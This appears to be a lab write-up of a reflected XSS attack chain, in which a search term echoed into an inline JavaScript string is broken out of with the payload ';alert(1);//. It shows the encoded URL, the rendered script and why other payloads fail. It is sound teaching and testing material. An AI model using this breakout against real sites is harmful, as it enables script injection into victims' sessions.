# Attack Chain — Reflected XSS via single-quote breakout in JS string

## Data flow
```
Attacker crafts URL   /?search=';alert(1);//
   │  (transport: %27%3Balert(1)%3B%2F%2F)
   ▼
[INPUT] GET /?search=…  →  server echoes term into inline script
   │
   ▼
[PROCESSING] template:  var searchTerms = 'TERM';
   │  encoding: <>→entities ; ' " \ raw (verified byte-exact)
   ▼
[SINK] response script parses as:  var searchTerms = '';alert(1);//';
   │  ' terminates the string → ; ends the statement → alert(1) runs
   │  → // comments out the template tail ';
   ▼
[TRUST BOUNDARY CROSSED] template text(data) → script source(code) at victim parse
   ▼
RESULT: alert(1) during page load in app origin, victim context; tracker
document.write on the following line runs normally (comment ends at newline)
```

## The exact breakout bytes
- Template: `var searchTerms = '` + TERM + `';`
- TERM = `';alert(1);//`
- Rendered: `var searchTerms = '';alert(1);//';`
- Roles: 1st `'` (mine) terminates the string; `;` ends the empty declaration;
  `alert(1)` statement; `//` neutralizes the template's trailing `';`.

## Why this shape and nothing else
- `</script><script>alert(1)</script>` → `&lt;/script&gt;…` (proven dead) — the
  title's stated defense, real for the tag degree of freedom.
- `"` cannot terminate a `'`-quoted string (inert content) — only `'` works.
- `\` tricks unnecessary AND insufficient here: a trailing `\` would escape the
  template `'` and strand the string across the newline (single-quoted strings can't
  span lines → throw). Unlike the eval-JSON lab, no escape-shift is needed because
  quotes are raw — the escaper, not the sink, sets difficulty.
- Raw newline in input would BREAK the string (syntax error, no execution) — another
  reason `'`-termination + `//` is the forced shape.

## Expected response sequence (verified)
1. `GET /?search=<encoded payload>` → 200, breakout bytes in the script block.
2. Browser parses the inline script; injected statement runs during initial parse.
3. `alert(1)` → `is-solved` (first poll); downstream tracker unaffected.